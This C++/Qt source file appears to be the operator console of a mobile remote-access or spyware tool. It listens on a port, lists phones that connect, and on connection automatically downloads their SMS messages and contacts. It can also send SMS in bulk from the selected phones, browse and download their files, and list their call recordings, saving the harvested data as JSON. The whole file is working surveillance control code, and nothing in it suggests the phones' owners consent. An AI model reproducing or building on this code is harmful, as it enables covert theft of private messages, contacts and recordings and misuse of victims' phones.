#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QJsonDocument>
#include <QJsonArray>
#include <QJsonObject>
#include <QDateTime>
#include <QFile>
#include <QDir>
#include <QTextStream>
#include <QMessageBox>
#include <QInputDialog>
#include <QFileDialog>
#include "sendsmsdialog.h"
#include "filetransferdialog.h"
#include "callrecorddialog.h"
#include "progressdialog.h"
#include "filedownload.h"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    init();
    initView();
    updateView();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::init()
{
    QObject::connect(&mSessionManager,SIGNAL(onNewSession(NetworkSession*)),this,SLOT(handleNewSession(NetworkSession*)));
    QObject::connect(&mSessionManager,SIGNAL(onStartSessionSuccess(QString,QString)),this,SLOT(onStartSessionSuccess(QString,QString)));
    QObject::connect(&mSessionManager,SIGNAL(onStartSessionFailed(QString,QString)),this,SLOT(onStartSessionFailed(QString,QString)));
    QObject::connect(&mModel,SIGNAL(onHostOnline(QHostAddress,quint16)),this,SLOT(onHostOnline(QHostAddress,quint16)));
}

void MainWindow::initView()
{
    QObject::connect(&mSessionManager, SIGNAL(onIncomeHost(QString,QHostAddress,quint16)), &mModel, SLOT(putItem(QString,QHostAddress,quint16)));
    QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
    ui->tableView->setModel(&mModel);
    ui->tableView->setContextMenuPolicy(Qt::CustomContextMenu);
    ui->tableView->resizeColumnToContents(0);

    this->initMenu(&this->mRightMenu);
    this->initMenuWithItem(&this->mRightMenuWithItem);
    this->initMenu(&this->mRightMenuWithItem);

    ui->actionStartServer->setText(QStringLiteral("开始监听"));
    QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));

    ui->actionAutoLoadData->setText(QStringLiteral("上线自动载入数据"));

    for(int i = 1; i<mModel.columnCount(); ++i) {
        ui->tableView->setColumnWidth(i, 150);
    }

    outputLogWarning(QStringLiteral("====================   程序开始运行  ===================="));
}

void MainWindow::updateView()
{
    ui->hostCountLabel->setText(QStringLiteral("主机数: %1, 选中主机数: %2").arg(mModel.rowCount()).arg(mModel.getSelectedCount()));
}

void MainWindow::onHostOnline(const QHostAddress& host, quint16 port)
{
    if(!ui->actionAutoLoadData->isChecked())return;
    outputLogNormal(QStringLiteral("从 %1:%2 下载联系人和短信数据").arg(host.toString()).arg(port));
    mSessionManager.startSessionOnHost(host, port, ACTION_UPLOAD_SMS);
    mSessionManager.startSessionOnHost(host, port, ACTION_UPLOAD_CONTACT);
}

void MainWindow::handleServerStart()
{
    if(mSessionManager.isStart())
    {
        mSessionManager.stop();
        mModel.cleanAll();
        ui->actionStartServer->setText(QStringLiteral("开始监听"));
        outputLogNormal(QStringLiteral("停止监听"));
    }
    else
    {
        bool ok = false;
        int port = QInputDialog::getInt(this, QStringLiteral("监听端口"), QStringLiteral("输入端口:"), 8000,  1, 65535, 1, &ok);
        if(ok)
        {
            if(mSessionManager.start(port))
            {
                ui->actionStartServer->setText(QStringLiteral("停止监听 (监听在 %1 端口)").arg(port));
                outputLogNormal(QStringLiteral("监听在 %1 端口").arg(port) );
            }
            else
            {
                QMessageBox::warning(this,QString("Warning"),QStringLiteral("监听在端口 %1 失败").arg(port));
                outputLogWarning(QStringLiteral("[失败] 监听在 %1 端口").arg(port) );
            }
        }

    }
}

void MainWindow::handleNewSession(NetworkSession* networkSession)
{
    QMutexLocker locker(&mMutex);

    // add extra data
    if(networkSession->getSessionName()==ACTION_SEND_SMS)
    {
        QObject::connect(networkSession->socket(),SIGNAL(error(QAbstractSocket::SocketError)),networkSession,SLOT(deleteLater()));
        QObject::connect(networkSession,SIGNAL(onReadData(QByteArray,NetworkSession*)),this,SLOT(handleReceiveData(QByteArray,NetworkSession*)));

        networkSession->write(networkSession->getSessionData());
        networkSession->deleteLater();
    }
    else if(networkSession->getSessionName()==ACTION_UPLOAD_SMS || networkSession->getSessionName()==ACTION_UPLOAD_CONTACT)
    {
        QObject::connect(networkSession->socket(),SIGNAL(error(QAbstractSocket::SocketError)),networkSession,SLOT(deleteLater()));
        QObject::connect(networkSession,SIGNAL(onReadData(QByteArray,NetworkSession*)),this,SLOT(handleReceiveData(QByteArray,NetworkSession*)));

        QJsonObject jsonObject;
        QJsonDocument jsonDocument;
        jsonObject.insert(QString("action"), networkSession->getSessionName());
        jsonDocument.setObject(jsonObject);
        networkSession->write(jsonDocument.toJson());
    }
    else if(networkSession->getSessionName()==ACTION_FILE_LIST)
    {
        QJsonObject jsonObject;
        QJsonDocument jsonDocument;
        jsonObject.insert(QString("action"), networkSession->getSessionName());
        jsonDocument.setObject(jsonObject);
        networkSession->write(jsonDocument.toJson());
        FileTransferDialog *dialog = new FileTransferDialog(networkSession,mSessionManager);
        dialog->show();
    }
    else if(networkSession->getSessionName()==ACTION_CALL_RECORD)
    {
        QJsonObject jsonObject;
        QJsonDocument jsonDocument;
        jsonObject.insert(QString("action"), networkSession->getSessionName());
        jsonDocument.setObject(jsonObject);
        networkSession->write(jsonDocument.toJson());
        CallRecordDialog *dialog = new CallRecordDialog(networkSession,mSessionManager);
        dialog->show();
        dialog->putPath("");
    }
    else if(networkSession->getSessionName()==ACTION_FILE_DOWNLOAD)
    {
        networkSession->setReceivePackage(false);
        networkSession->write(networkSession->getSessionData());
        QJsonObject jsonObject = QJsonDocument::fromJson(networkSession->getSessionData()).object();
        QString save_path = jsonObject.take("save_path").toString();
        QString path = jsonObject.take("path").toString();
        int length = jsonObject.take("length").toInt();

        FileDownload* filedownload = new FileDownload(networkSession, save_path, length);
        ProgressDialog *processDialog = new ProgressDialog(path);
        QObject::connect(processDialog,SIGNAL(destroyed()),networkSession,SLOT(close()));
        QThread * thread = new QThread();
        QObject::connect(filedownload,SIGNAL(destroyed()),thread,SLOT(quit()));
        QObject::connect(filedownload,SIGNAL(progress(int)),processDialog,SLOT(setProgressValue(int)));
        processDialog->show();

        QObject::connect(thread,SIGNAL(finished()),thread,SLOT(deleteLater()));
        //QObject::connect(thread,SIGNAL(destroyed()),processDialog,SLOT(close()));

        filedownload->moveToThread(thread);
        networkSession->moveToThread(thread);
        networkSession->socket()->setParent(NULL);
        networkSession->socket()->moveToThread(thread);
        thread->start();
        emit filedownload->start();
    }
    else
    {
        networkSession->deleteLater();
        return;
    }
}

void MainWindow::handleReceiveData(QByteArray data, NetworkSession* networkSession)
{
    QJsonObject jsonObject = QJsonDocument::fromJson(data).object();
    QJsonObject::iterator it = jsonObject.begin();
    if(it == jsonObject.end())
    {
        return;
    }
    QJsonDocument jsonDocument;
    jsonDocument.setArray(it.value().toArray());
    QString fileName = QDateTime::currentDateTime().toString("yyyy-MM-dd_hh,mm,ss") + "_" + QUuid::createUuid().toString() + ".json";
    QDir().mkpath(networkSession->getSessionName());
    QFile file(networkSession->getSessionName() + "/" + fileName);
    file.open(QFile::WriteOnly|QFile::Text);
    QTextStream stream(&file);
    stream << jsonDocument.toJson();
    file.flush();
    file.close();
    outputLogNormal(QStringLiteral("传输成功, 数据存储为: %1").arg(networkSession->getSessionName() + "/" + fileName));
    networkSession->deleteLater();
}

void MainWindow::sendSms()
{
    if(mModel.getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
        return;
    }
    SendSmsDialog sendSmsDialog(this);
    if(sendSmsDialog.exec()==QDialog::Accepted)
    {
        QJsonObject jsonObject;
        QJsonDocument jsonDocument;
        jsonObject.insert(QString("action"), QString(ACTION_SEND_SMS));
        jsonObject.insert(QString("content"), sendSmsDialog.getContent());
        if(sendSmsDialog.isSendNumberList())
        {
            QJsonArray jsonArray;
            vector<QString> numberList = sendSmsDialog.getPhoneNumberList();
            for(unsigned int i=0; i<numberList.size(); ++i)
            {
                jsonArray.append(numberList.at(i));
            }
            jsonObject.insert(QString("only"), jsonArray);
        }
        jsonDocument.setObject(jsonObject);
        mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_SEND_SMS, jsonDocument.toJson());
    }
}
void MainWindow::loadSms()
{
    if(mModel.getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
        return;
    }
    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_SMS);
}

void MainWindow::loadContact()
{
    if(mModel.getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QStringLiteral("请勾选至少一台主机"));
        return;
    }
    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), ACTION_UPLOAD_CONTACT);
}

void MainWindow::listFile()
{
    mSessionManager.startSessionOnHost(mCurrentHostAddress, mCurrentPort, ACTION_FILE_LIST);
}

void MainWindow::listAudioRecord()
{
    mSessionManager.startSessionOnHost(mCurrentHostAddress, mCurrentPort, ACTION_CALL_RECORD);
}

void MainWindow::outputLogNormal(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + text );
}

void MainWindow::outputLogWarning(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#F00>" + text + "</font>");
}

void MainWindow::outputLogSuccess(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#0A0>" + text + "</font>");
}


void MainWindow::onStartSessionSuccess(const QString& sessionName, const QString& addr)
{
    outputLogSuccess( QStringLiteral("[成功] 在 %1 上执行 '%2'").arg(addr).arg(sessionName) );
}
void MainWindow::onStartSessionFailed(const QString& sessionName, const QString& addr)
{
    outputLogWarning( QStringLiteral("[失败] 在 %1 上执行 '%2'").arg(addr).arg(sessionName) );
}

void MainWindow::on_tableView_doubleClicked(const QModelIndex &index)
{
//    vector<pair<QHostAddress, quint16> > list = mModel.getHostAddr();
//    if(index.row()>= list.size()) return;
//    mCurrentHostAddress = list.at(index.row()).first;
//    mCurrentPort = list.at(index.row()).second;
//    mLeftMenu.popup(cursor().pos());
}

void MainWindow::on_tableView_customContextMenuRequested(const QPoint &pos)
{
    vector<pair<QHostAddress, quint16> > list = mModel.getHostAddr();
    QModelIndex index = ui->tableView->indexAt(pos);
    if(0<=index.row() && index.row() <list.size())
    {
        mRightMenuWithItem.exec(QCursor::pos());
        mCurrentHostAddress = list.at(index.row()).first;
        mCurrentPort = list.at(index.row()).second;
    }
    else
    {
        mRightMenu.exec(QCursor::pos());
    }
}

void MainWindow::initMenuWithItem(QWidget* widget)
{
    QAction* aDownloadFile;
    widget->addAction(aDownloadFile = new QAction(QStringLiteral("文件传输"), widget));
    QObject::connect(aDownloadFile, SIGNAL(triggered()), this, SLOT(listFile()));

    QAction* aAudioRecordList;
    widget->addAction(aAudioRecordList = new QAction(QStringLiteral("录音列表"),widget));
    QObject::connect(aAudioRecordList, SIGNAL(triggered()), this, SLOT(listAudioRecord()));

    QAction *separator = new QAction(QString(),widget);
    separator->setSeparator(true);
    widget->addAction(separator);
}

void MainWindow::initMenu(QWidget* widget)
{
    QAction *aAll,*aNone,*aReverse;
    widget->addAction(aAll = new QAction(QStringLiteral("全选"),widget));
    widget->addAction(aNone = new QAction(QStringLiteral("全不选"),widget));
    widget->addAction(aReverse = new QAction(QStringLiteral("反选"),widget));

    QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
    QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
    QObject::connect(aReverse,SIGNAL(triggered()),&mModel,SLOT(reverseSelect()));

    QAction *separator = new QAction(QString(),widget);
    separator->setSeparator(true);
    widget->addAction(separator);


    QAction *aSendSms,*aLoadContact,*aLoadSms;
    widget->addAction(aSendSms = new QAction(QStringLiteral("发送短信"),widget));
    widget->addAction(aLoadContact = new QAction(QStringLiteral("载入联系人数据"),widget));
    widget->addAction(aLoadSms = new QAction(QStringLiteral("载入短信数据"),widget));

    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
}
